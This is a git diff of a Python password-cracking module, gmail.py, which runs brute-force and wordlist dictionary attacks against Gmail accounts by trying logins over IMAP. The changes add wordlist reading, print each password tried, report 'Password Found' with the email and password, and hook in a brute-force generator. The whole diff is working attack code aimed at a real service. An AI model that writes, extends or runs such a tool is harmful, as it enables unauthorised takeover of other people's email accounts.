@@ -13,10 +13,10 @@ How To Use:
 
 Run the module as the following
 
->>> python gmail.py username=USERNAME alphabets=[ALPHABETS] begin=[BEGIN] until=[UNTIL] output=[OUTPUT]
+>>> python gmail.py email=EMAIL pwd=[PASSWORDLIST] alphabets=[ALPHABETS] begin=[BEGIN] until=[UNTIL] output=[OUTPUT]
 
 Every parameter in square brackets '[PARAMETER]' are optional
-the only required parameter is USERNAME
+the only required parameter is EMAIL
 
 """
 __version__ = '0.01'
@@ -24,10 +24,9 @@ __author__ = 'Youssef Hesham'
 
 import itertools
 import imaplib
-import weely
+from weely import bruteforce
 from parser import Parser
-from helpdoc import goodbye
-from helpdoc import gmail_usage
+from helpdoc import gmail_usage, gmail_banner
 
 def _check_s(i, e, p) -> str:
     """
@@ -49,7 +48,6 @@ def _check_b(i, e, p) -> bool:
     except:
         return False
     else:
-        print(f"Password Found {e}:{p}")
         return True
 
 def check_gmail_bf(uemail, pwd,
@@ -104,9 +102,13 @@ def check_gmail_dt(uemail, pwdlist) -> str:
         `python gmail.py email=USERNAME pwdlist=PWDLIST`
     """
     i = imaplib.IMAP4_SSL('imap.gmail.com')
-    for pwd in pwdlist:
-        if _check_s(i, uemail, pwd) != None:
-            return str(_check_s(i, uemail, pwd))
+    pwdlist = open(pwdlist, 'r')
+    for pwd in pwdlist.readlines():
+        if '\n' in pwd:
+            pwd = pwd.replace('\n', '')
+        print(f"Trying {pwd}")
+        if _check_b(i, uemail, pwd):
+            print(f"Password Found: {uemail}:{pwd}")
 
 def main() -> None:
     """
@@ -116,23 +118,23 @@ def main() -> None:
     It will use the bruteforce function in
     weely module
     """
-
-# TODO: fix this shit
-
     parser = Parser('gmail') # initialize arguments
-    if parser.get_email() == None:
+    if parser.get_email() == None: # Check if the user entered a email to work on
+        gmail_banner()
         gmail_usage()
 
-    if parser.get_pwdlist() == None:
+    if parser.get_pwdlist() == None: # BruteForce Attack
         bruteforce(parser.get_alphabets(),
                    parser.get_output(),
                    parser.get_begin(),
                    parser.get_until(),
 
                    api=True,
-                   func=check_gmail,
+                   func=check_gmail_bf,
                    func_farg=parser.get_email())
-
+    else: # Dictionary Attack
+        pwd = check_gmail_dt(parser.get_email(),
+                       parser.get_pwdlist())
 
 
 if __name__ == '__main__':
